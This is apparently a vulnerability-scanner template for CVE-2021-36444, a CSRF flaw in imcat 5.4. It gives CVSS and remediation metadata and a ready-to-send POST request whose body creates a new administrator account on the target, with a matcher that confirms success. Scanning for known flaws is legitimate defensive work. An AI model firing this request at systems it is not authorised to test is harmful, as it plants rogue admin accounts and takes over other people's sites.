id: CVE-2021-36444

info:
  name: CSRF Vulnerability in imcat 5.4
  author: ProjectDiscoveryAI
  severity: high
  description: Cross Site Request Forgery (CSRF) vulnerability in imcat 5.4 allows remote attackers to gain escalated privileges via flaws one time token generation on the add administrator page.
  impact: |
    Successful exploitation could lead to account takeover, data manipulation, or unauthorized actions.
  remediation: |
    Implement CSRF tokens, origin checks, and referer headers to mitigate the vulnerability.
  reference:
    - https://github.com/peacexie/imcat/issues/9
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cve-id: CVE-2021-36444
    cwe-id: CWE-352
    epss-score: 0.0016
    epss-percentile: 0.53794
    cpe: cpe:2.3:a:txjia:imcat:5.4:*:*:*:*:*:*:*
  metadata:
    vendor: txjia
    product: imcat

http:
  - method: POST
    path:
      - "{{BaseURL}}/imcat/root/run/adm.php?dops-a&mod=adminer&view=form&stype=&"

    body: |
      recbk=http%3A%2F%2F127.0.0.1%2Fimcat%2Froot%2Frun%2Fadm.php%3Fdops-a%26mod%3Dadminer&fm%5Buid%5D=2021-6p-j6xk&fm%5Buno%5D=1&fm%5Buname%5D=qwe_123&fm%5Bupass%5D=adm_123&fm%5Bgrade%5D=supper&fm%5Bshow%5D=1&fm%5Bmname%5D=qwe_123&fm%5Bindep%5D=inadm&fm%5Bmiuid%5D=&fm%5Bmtel%5D=12345678091&fm%5Bmemail%5D=23wqw%4022.com&fm%5Bmaddr%5D=&fm%5Batime%5D=2021-06-21+17%3A14%3A49&fm%5Betime%5D=2021-06-21+17%3A14%3A49&fm%5Bauser%5D=adm_123&fm%5Beuser%5D=adm_123&fm%5Baip%5D=127.0.0.1&fm%5Beip%5D=127.0.0.1&bsend=%E6%8F%90%E4%BA%A4&mod=adminer&isadd=1

    headers:
      Content-Type: application/x-www-form-urlencoded
    matchers:
      - type: word
        words:
          - "administrator added successfully"
        part: body
